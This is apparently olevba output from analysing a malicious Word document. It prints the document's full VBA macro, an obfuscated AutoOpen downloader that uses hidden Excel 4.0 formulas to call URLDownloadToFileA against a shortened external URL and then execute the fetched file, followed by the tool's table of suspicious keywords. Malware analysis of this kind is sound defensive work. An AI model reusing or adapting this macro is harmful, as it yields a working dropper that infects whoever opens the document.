olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Dotmer.gen-a9bf119619e2f4679faef45b00a071a7bfb1b194899011770bc22e6b313c3378
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Dim ExcelSheet As Object
Dim titu, maxi, key, pap, u, l As String

titu = "h" + "tt" + "ps" + "://bit" + ".do/" + "fPQKY"
maxi = ActiveDocument.BuiltInDocumentProperties("Co" & Chr(109) & "men" & Chr(116) & "s").Value

u = "ur" & Chr(108) & Chr(109) & "on"
l = Chr(85) & "R" & Chr(76) & Chr(68) & "own" & Chr(108) & "oadTo" & Chr(70) & "i" & Chr(108) & "e" & Chr(65)
key = "=CAL" & Chr(76) & "(""" + u + """, """ + l + """, ""JJCC" & Chr(74) & "J"", 0, """ + titu + """, """ + maxi + """, 0, 0)"

addition = 3 + 1

mynumber = (12 - 4) - addition

pap = "Example"

Set ExcelSheet = CreateObject("Excel.Application")

Set Workbook = ExcelSheet.workbooks.Add()

Set Worksheets = ExcelSheet.Worksheets

Worksheets.Add Before:=Worksheets(1), Count:=1, Type:=mynumber

ExcelSheet.Application.Visible = 0

ExcelSheet.Range("A127").Name = pap

ExcelSheet.Range("A127") = "=ERR" + "OR" + "(FALSE)"

ExcelSheet.Application.Cells(129, 1).Value = "=I" + "F(ISNUMBER(SEARCH(""32"",GET.WORKSPACE(1))), GOTO(B127), GOTO(C127))"

ExcelSheet.Application.Cells(129, 2).Value = key

ExcelSheet.Application.Cells(131, 2).Value = "=E" + "XEC(""" + maxi + """)"

ExcelSheet.Range("B133") = "=CLOSE(FALSE)"

ExcelSheet.Application.Cells(129, 3).Value = "=C" + "AL" & Chr(76) & "(""" + u + """, """ + l + """, ""BBCC" & Chr(66) & "B"", 0, """ + titu + """, """ + maxi + """, 0, 0)" + "=E" + "XEC" + "(""" + maxi + """)"

ExcelSheet.Range("C133") = "=C" + "LOSE(FALSE)"

ExcelSheet.Sheets(1).Visible = 2

ExcelSheet.Run pap

ExcelSheet.Application.Quit

Set ExcelSheet = Nothing
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

